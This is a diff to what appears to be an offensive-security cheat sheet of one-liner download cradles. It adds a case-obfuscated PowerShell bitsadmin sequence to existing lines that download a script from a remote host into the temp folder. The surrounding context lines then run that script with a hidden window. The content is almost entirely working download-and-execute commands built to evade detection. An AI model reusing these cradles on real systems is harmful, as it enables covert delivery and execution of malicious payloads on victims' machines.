@@ -2115,6 +2115,8 @@ This section contains onelinner crandle downloaders that for one reason or anoth
       powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
 
       powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:SSArt http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
+      
+      powershell -w 1 bitsadmin /create /dOwNlOaD ssart;start-sleep -seconds 1;bitsadmin /addfile ssart http://192.168.1.73/Hello.ps1 $env:tmp\Hello.ps1;start-sleep -seconds 1;bitsadmin /setcustomheaders ssart User-Agent:SSArt;start-sleep -seconds 1;bitsadmin /resume ssart;start-sleep -seconds 1;bitsadmin /complete ssart
 
 <br /><br />
 **Curl Downloaders**<br />
